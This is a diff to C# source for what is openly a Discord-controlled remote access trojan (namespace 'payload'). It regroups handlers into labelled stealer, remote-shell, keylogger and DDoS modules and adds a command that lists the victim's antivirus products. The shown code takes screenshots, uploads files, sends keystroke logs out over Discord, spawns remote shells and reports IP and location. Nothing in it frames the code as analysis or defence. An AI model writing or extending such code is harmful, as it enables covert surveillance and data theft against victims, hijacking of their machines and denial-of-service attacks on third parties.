@@ -5,6 +5,10 @@ using System.IO;
 using System.Net;
 using System.Text;
 using System.Diagnostics;
+using System.Net.Http;
+using System.Globalization;
+using System.Management;
+using System.Linq;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
@@ -13,8 +17,6 @@ using System.Windows.Forms;
 using Discord;
 using Discord.WebSocket;
 using Newtonsoft.Json;
-using System.Net.Http;
-using System.Globalization;
 
 namespace payload
 {
@@ -100,6 +102,7 @@ namespace payload
 
             switch (cmd)
             {
+                // Stealer module
                 case "get":
                     {
                         Bitmap sc = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
@@ -121,14 +124,6 @@ namespace payload
                         await message.Channel.SendFileAsync(args[1]);
                         break;
                     }
-                case "shell":
-                    {
-                        if (args[0] != Environment.MachineName) break;
-                        Shell s = new Shell(await message.Channel.SendMessageAsync("``` ```"));
-                        shells.Add(s);
-                        s.Start();
-                        break;
-                    }
                 case "ipinfo":
                     {
                         if (args[0] != Environment.MachineName) break;
@@ -139,15 +134,18 @@ namespace payload
                         await message.Channel.SendMessageAsync($"IP address: {address}\nLocation: {location}");
                         break;
                     }
-                case "getkeylog":
+
+                // Remote Access Module
+                case "shell":
                     {
                         if (args[0] != Environment.MachineName) break;
-                        MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(keylog));
-                        await message.Channel.SendFileAsync(ms, "unknown.txt");
-                        ms.Dispose();
-                        keylog = string.Empty;
+                        Shell s = new Shell(await message.Channel.SendMessageAsync("``` ```"));
+                        shells.Add(s);
+                        s.Start();
                         break;
                     }
+
+                // Keylogger Module
                 case "startkeylogger":
                     {
                         if (args[0] != Environment.MachineName) break;
@@ -162,6 +160,17 @@ namespace payload
                         await message.Channel.SendMessageAsync($"Keylogger stopped on {Environment.MachineName}");
                         break;
                     }
+                case "getkeylog":
+                    {
+                        if (args[0] != Environment.MachineName) break;
+                        MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(keylog));
+                        await message.Channel.SendFileAsync(ms, "unknown.txt");
+                        ms.Dispose();
+                        keylog = string.Empty;
+                        break;
+                    }
+
+                // DDOS Module
                 case "startddos":
                     {
                         ddos = true;
@@ -174,6 +183,17 @@ namespace payload
                         ddos = false;
                         toddos = string.Empty;
                         await message.Channel.SendMessageAsync($"DDOS stopped on all machines.");
+                        break;
+                    }
+
+                // Miscellaneous
+                case "getav":
+                    {
+                        if (args[0] != Environment.MachineName) break;
+                        ManagementObjectSearcher searcher = new ManagementObjectSearcher($"\\\\{Environment.MachineName}\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
+                        List<string> instances = searcher.Get().Cast<ManagementObject>().Select(x => (string)x.GetPropertyValue("displayName")).ToList();
+                        await message.Channel.SendMessageAsync($"Installed antivirus products:\n```{string.Join("\n", instances)}```");
+                        searcher.Dispose();
                         break;
                     }
                 case "uninfect":
